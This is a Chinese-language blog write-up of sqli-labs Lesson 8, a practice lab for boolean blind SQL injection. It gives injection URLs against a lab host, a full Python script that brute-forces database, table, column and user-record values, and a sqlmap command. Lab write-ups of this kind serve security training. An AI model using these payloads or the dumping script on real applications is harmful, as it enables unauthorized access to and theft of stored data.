---
title: sqli-labs-lession 8 GET单引号布尔型盲注
date: 2018-09-26 11:17:37
tags:
categories: sql注入
---

# sqli-labs-lession 8 GET单引号布尔型盲注 #

## 登录界面 ##

![1](/img/sql/Lesson-8/1.png)


## 手注 ##

### 注入点 ###

`http://10.60.250.151/sqlilabs/Less-8/?id=1'`

![4](/img/sql/Lesson-8/4.png)

没有信息显示,但是页面改变了

`http://10.60.250.151/sqlilabs/Less-8/?id=1'%23`

![5](/img/sql/Lesson-8/5.png)

判断为单引号闭合

### 获取字段数 ###

`http://10.60.250.151/sqlilabs/Less-8/?id=1' order by 3%23`

![6](/img/sql/Lesson-8/6.png)

`http://10.60.250.151/sqlilabs/Less-8/?id=1' order by 4%23`

![7](/img/sql/Lesson-8/7.png)

`order by 3`出现`You are in`,`order by 4`没有,确认字段数为3。

### 获取数据库 ###

#### 获取数据库名长度 ####

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 8=length(database())%23`

![8](/img/sql/Lesson-8/8.png)

#### 获取数据库名 ####

left(str,n):截取字段`str`左侧的n个字符。

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 's'=left(database(),1)%23`

返回正确页面,确认第一个字符是`s`

![9](/img/sql/Lesson-8/9.png)

	中间都是同样的确认过程...

这样手动确认,直到数据库名长度测完(十分费力...),下面是最终结果

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 'security'=left(database(),8)%23`

![10](/img/sql/Lesson-8/10.png)

### 获取表 ###

#### 获取表数 ####

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 4=(select count(table_name) from information_schema.tables where table_schema='security')%23`

![11](/img/sql/Lesson-8/11.png)
#### 获取表名 ####

采用二分法。

以下返回`You are in`表示`True`,无返回表示`Flase`

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 95<=ascii(substr((select table_name from information_schema.tables where table_schema="security" limit 0,1),1,1))%23`

95:True

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 109<=ascii(substr((select table_name from information_schema.tables where table_schema="security" limit 0,1),1,1))%23`

109:Flase

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 102<=ascii(substr((select table_name from information_schema.tables where table_schema="security" limit 0,1),1,1))%23`

102:Flase

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 98<=ascii(substr((select table_name from information_schema.tables where table_schema="security" limit 0,1),1,1))%23`

98:True

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 100<=ascii(substr((select table_name from information_schema.tables where table_schema="security" limit 0,1),1,1))%23`

100:True

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 101<=ascii(substr((select table_name from information_schema.tables where table_schema="security" limit 0,1),1,1))%23`

101:True

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 101=ascii(substr((select table_name from information_schema.tables where table_schema="security" limit 0,1),1,1))%23`

![12](/img/sql/Lesson-8/12.png)

确定ascii码值为101,对应的字符为`e`。

接下来用二分法判断第一个表的第二个字符。

最终能测试出存在下面几张表:

* emails
* referers
* uagents
* users

### 获取列 ###

#### 获取列数 ####

对感兴趣的表获取列数,以users为例。

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 3=(select count(column_name) from information_schema.columns where table_name='users')%23`

![13](/img/sql/Lesson-8/13.png)

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 4=(select count(column_name) from information_schema.columns where table_name='users')%23`

![14](/img/sql/Lesson-8/14.png)

根据上面两张图可以发现`users`的列数有3个。

#### 获取列长度 ####

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 2=length((select column_name from information_schema.columns where table_name="users" limit 0,1))%23`

![15](/img/sql/Lesson-8/15.png)

说明`users`表中第一列长度为2。

可以测试出总共3列长度分别为:2,8,8。

#### 获取列名 ####

采用二分法。

以下返回`You are in`表示`True`,无返回表示`Flase`

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 95<=ascii(substr((select column_name from information_schema.columns where table_name="users" limit 0,1),1,1))%23`

95:True

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 109<=ascii(substr((select column_name from information_schema.columns where table_name="users" limit 0,1),1,1))%23`

109:False

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 102<=ascii(substr((select column_name from information_schema.columns where table_name="users" limit 0,1),1,1))%23`

102:True

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 106<=ascii(substr((select column_name from information_schema.columns where table_name="users" limit 0,1),1,1))%23`

106:False

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 104<=ascii(substr((select column_name from information_schema.columns where table_name="users" limit 0,1),1,1))%23`

104:True

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 105<=ascii(substr((select column_name from information_schema.columns where table_name="users" limit 0,1),1,1))%23`

105:True

确定ascii码值为105,对应的字符为`i`。因为上面查出的列长度为2,再测试第一列的的第二个字符就可以了,还是用二分法查第二个字符。

直接上结果:

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 100=ascii(substr((select column_name from information_schema.columns where table_name="users" limit 0,1),2,1))%23`


![16](/img/sql/Lesson-8/16.png)

ascii码值为100,对应的字符为`d`,第一列为`id`,同理可以获取到其他两列为`username`, `password`。

### 获取字段 ###

获取字段也和上面的大同小异了,直接给结果。

也是获取字段数量->获取字段长度->获取字段名的流程。

#### 获取字段数量 ####

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 13=(select count(username) from security.users)%23`

字段数是13。

![17](/img/sql/Lesson-8/17.png)

#### 获取字段长度 ####

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 4=length((select username from security.users limit 0,1))%23`

![18](/img/sql/Lesson-8/18.png)

#### 获取字段值 ####

`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 68=ascii(substr((select username from security.users limit 0,1),1,1))%23`

![19](/img/sql/Lesson-8/19.png)

ascii码值为68,对应的字符为`D`,第一个账户的第一个字母是`D`。

可以发现上述过程很多都是重复的,可以写个脚本运行。

### 脚本 ###

用Python写的一个爆破脚本,没有用二分法,也没封装起来,力度垃圾,凑合着用。

脚本运行结果:

![20](/img/sql/Lesson-8/20.png)

![21](/img/sql/Lesson-8/21.png)

	import requests
	db_name = ''#''security'#数据库名
	db_len = 0 #当前数据库长度
	table_num = 0#数据库表数目
	table_names = '' #数据表名
	table_lenlist = [] #数据表名长度列表
	table_namelist = [] #数据表名列表
	column_numlist = [] #数据表列数
	column_lenlist = [] #列名长度列表
	column_namelist = [] #列名列表
	dump_numlist = []#字段数量列表
	url = 'http://10.60.250.151/sqlilabs/Less-8/?id=1'
	db_payload = ''
	i = j = k = l = m = 0

	left = 97
	right = 123
	
	#查询当前数据库长度
	print("查询当前数据库长度。。。")
	for i in range(1, 21):
	    db_payload = "' and %d=(select length(database()))--+" % i
	    r = requests.get(url+db_payload)
	    if "You are in" in r.text:
	        db_len = i
	        break
	print("当前数据库长度为", db_len)
	
	#暴破当前数据库名
	print("暴破当前数据库名...")
	#数据库名长度
	for i in range(1, db_len+1):
	    #爆破字段区域
	    for j in range(left, right):
	        db_payload = "' and (left(database(), %d))='%s'--+" % (i, db_name+chr(j))
	        #print(url+db_payload)
	        r = requests.get(url+db_payload)
	        if "You are in" in r.text:
	            db_name += chr(j)
	            print('当前数据库名猜解：'+db_name)
	            break
	print("当前数据库名:\n[+]", db_name)
	
	#数据库中表数目
	print("当前数据库表数目....")
	for i in range(1,100):
	    db_payload = "' and %d=(select count(table_name) from information_schema.tables where table_schema='%s')--+" % (i, db_name)
	    #print(url+db_payload)
	    r = requests.get(url+db_payload)
	    if "You are in" in r.text:
	        table_num = i
	        break
	print("当前数据库表数目:", table_num)
	
	#数据库中表长度
	print("当前数据库表名长度....")
	for i in range(table_num):
	    table_len = 0 #表名长度
	    #获取数据表长度
	    for j in range(1, 21):
	        db_payload = "' and ascii(substr((select table_name from information_schema.tables where table_schema='%s' limit %d,1),%d,1))--+" % (db_name, i, j)
	        #print(url + db_payload)
	        r = requests.get(url + db_payload)
	        if "You are in" not in r.text:
	            table_len = j - 1
	            table_lenlist.append(table_len)
	            break
	print('表名长度：', table_lenlist)
	
	#数据库表名
	for i in range(table_num):
	    # 获取数据表名
	    table_names = ''
	    for j in range(1, table_lenlist[i]+1):
	        for k in range(left, right):
	            db_payload = "' and ascii(substr((select table_name from information_schema.tables where table_schema='%s' limit %d,1),%d,1))=%d--+" % (db_name, i, j, k)
	            #print(url+db_payload)
	            r = requests.get(url+db_payload)
	            if "You are in" in r.text:
	                table_names += chr(k)
	                print("当前表名猜解：", table_names)
	                break
	    table_namelist.append(table_names)
	print("当前数据表名:\n[+]", table_namelist)
	
	#数据列数
	print("各个数据表列数...")
	for i in range(table_num):
	    #print(i)
	    column_num = 0
	    for j in range(1, 21):
	        db_payload = "' and %d=(select count(column_name) from information_schema.columns where table_name='%s')--+" % (j, table_namelist[i])
	        #print(url + db_payload)
	        r = requests.get(url+db_payload)
	        if "You are in" in r.text:
	            column_num = j
	            #print("[+]"+table_namelist[i]+"表列数:"+ str(column_num))
	            column_numlist.append(column_num)
	            break
	print("[+]数据表列数", column_numlist)
	
	#猜解列长度
	print("猜解列长度....")
	for i in range(column_numlist[3]):
	    column_len = 0 #列名长度
	     #获取列长度
	    for j in range(1, 21):
	        db_payload = "' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit %d,1),%d,1))--+" % (i, j)
	        #print(url + db_payload)
	        r = requests.get(url + db_payload)
	        if "You are in" not in r.text:
	            column_len = j - 1
	            break
	    column_lenlist.append(column_len)
	print('user列名长度：', column_lenlist)
	
	#猜解列名
	print("猜解列名....")
	for i in range(column_numlist[3]):
	    column_names = ''
	    for j in range(1,column_lenlist[i]+1):
	        for k in range(left, right):
	            db_payload = "' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit %d,1),%d,1))=%d--+" % (
	                i, j, k)
	            #print(url + db_payload)
	            r = requests.get(url + db_payload)
	            if "You are in" in r.text:
	                column_names += chr(k)
	                print("当前表名猜解：", column_names)
	                break
	    column_namelist.append(column_names)
	print("users列名:\n[+]", column_namelist)
	
	#爆破字段
	print("爆破字段....")
	print('开始爆破字段数量：')
	for column in column_namelist[0:]:
	    #print(column, '：')
	    dump_num = 0
	    #爆破各个字段数量
	    for i in range(30):
	        db_payload = "' and %d=(select count(%s) from %s.%s)--+" % (i, column, db_name, table_namelist[-1])
	        #print(url+db_payload)
	        r = requests.get(url+db_payload)
	        if "You are in" in r.text:
	            dump_num = i
	            #print(i)
	            break
	    dump_numlist.append(dump_num)
	print('字段数：', dump_numlist)
	
	print('开始爆破字段：')
	for i in range(len(dump_numlist)):
	    print(column_namelist[i]+":")
	    #####字段个数####
	    for j in range(dump_numlist[i]):
	        dump_len = 0
	        dump_name = ''
	        ### 字段长度 ####
	        for k in range(1, 21):
	            db_payload = "' and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+" % (
	                column_namelist[i], db_name, table_namelist[-1], j, k)
	            r = requests.get(url + db_payload)
	            #print(url + db_payload)
	            if "You are in" not in r.text:
	                dump_len = k - 1
	                break
	        #print(dump_len)
	        for l in range(1, dump_len + 1):
	            for m in range(32, 127):
	                db_payload = "'and ascii(substr((select %s from %s.%s limit %d,1),%d,1))=%d--+"  % (
	                    column_namelist[i], db_name, table_namelist[-1], j, l, m)
	                #print(url + db_payload)
	                r = requests.get(url + db_payload)
	                if "You are in" in r.text:
	                    dump_name += chr(m)
	                    break
	        print('[+]', dump_name)

## SQLMAP ##

跟Lesson-1的过程没有什么大的区别。详细过程可以查看如下。

{% post_link sqli-labs-lession-1-基于错误的GET单引号字符型注入 点击查看Lesson-1%}

清除session

--flush-session  --fresh-queries

`sqlmap -u http://10.60.250.151/sqlilabs/Less-8/?id=1 --dbs --technique B --threads 10 --flush-session --fresh-queries
`

![3](/img/sql/Lesson-8/3.png)

直接上结果了。

![2](/img/sql/Lesson-8/2.png)